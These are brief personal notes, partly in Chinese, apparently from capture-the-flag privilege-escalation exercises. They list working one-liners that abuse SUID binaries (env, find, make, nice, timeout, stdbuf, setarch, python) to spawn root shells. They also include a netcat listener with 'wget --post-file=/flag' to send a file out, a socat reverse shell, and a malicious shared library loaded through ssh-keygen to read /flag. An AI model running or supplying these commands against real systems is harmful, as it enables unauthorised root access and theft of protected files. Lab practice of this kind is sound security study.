strace
跟踪程序的执行函数

.env提权
env sh -p

.find
find -execv /bin/sh -p \;

.chown
chown hacker file_path
文件的用户访问权限应用到hacker。

.level50 wget
wget -i /flag

terminal1:
nc -lp 88

terminal2:
wget --post-file=/flag http://localhost:88


.level51 ssh-keygen
ssh-keygen -D shared_binary 加载运行库文件
share.c
int C_GetFunctionList()
{
    sendfile(1,open("/flag",0),0,4096);
}

1.bash
bash -p

2.env
env /bin/sh -p

3.find
find . -exec /bin/sh -p \; -quit

4.make
make -s --eval=$'x:\n\t-'"/bin/sh -p"

5.nice
nice /bin/sh -p

6.timeout
timeout 1 /bin/sh -p

7.stdbuf
stdbuf -i0 /bin/sh -p

8.setarch
setarch $(arch) /bin/sh -p

9.socat
一个终端上监听:
socat file:'/dev/tty',raw,echo=0 tcp-listen:8888

另一个终端反弹shell:
socat tcp-connect:127.0.0.1:8888 exec:'/bin/sh -p',pty,stderr

10.python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'